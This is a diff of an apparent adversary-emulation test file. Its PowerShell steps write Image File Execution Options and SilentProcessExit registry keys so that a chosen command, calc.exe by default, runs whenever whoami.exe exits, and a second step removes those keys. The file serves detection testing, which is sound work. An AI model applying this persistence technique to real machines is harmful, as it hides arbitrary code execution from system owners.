@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "086282d8-de80-46c6-9df1-a6817fac3a08",
+      "id": "cf99f8ff-9e5c-44c3-83b6-920821c71cbb",
       "type": "execute-command",
       "data": {
-        "command": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n",
+        "command": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe",
         "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "96fe5f5b-bde9-45f4-b931-16b38388f348",
+      "id": "bda33a66-52eb-4755-8289-063ceafa9b08",
       "type": "execute-command",
       "data": {
-        "command": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force\n",
+        "command": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force",
         "command_type": "powershell"
       },
       "elevation_required": true
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "086282d8-de80-46c6-9df1-a6817fac3a08",
+      "s": "cf99f8ff-9e5c-44c3-83b6-920821c71cbb",
       "p": "on-success",
-      "o": "96fe5f5b-bde9-45f4-b931-16b38388f348"
+      "o": "bda33a66-52eb-4755-8289-063ceafa9b08"
     },
     {
-      "s": "086282d8-de80-46c6-9df1-a6817fac3a08",
+      "s": "cf99f8ff-9e5c-44c3-83b6-920821c71cbb",
       "p": "on-failure",
-      "o": "96fe5f5b-bde9-45f4-b931-16b38388f348"
+      "o": "bda33a66-52eb-4755-8289-063ceafa9b08"
     }
   ],
   "tags": [
@@ -43,16 +43,16 @@
   ],
   "input_arguments": [
     {
-      "name": "cmd_to_run",
-      "type": "string",
-      "description": "Command to execute\n",
-      "value": "cmd.exe /c calc.exe"
-    },
-    {
       "name": "process",
       "type": "string",
       "description": "Process to monitor\n",
       "value": "whoami.exe"
+    },
+    {
+      "name": "cmd_to_run",
+      "type": "string",
+      "description": "Command to execute\n",
+      "value": "cmd.exe /c calc.exe"
     }
   ]
 }
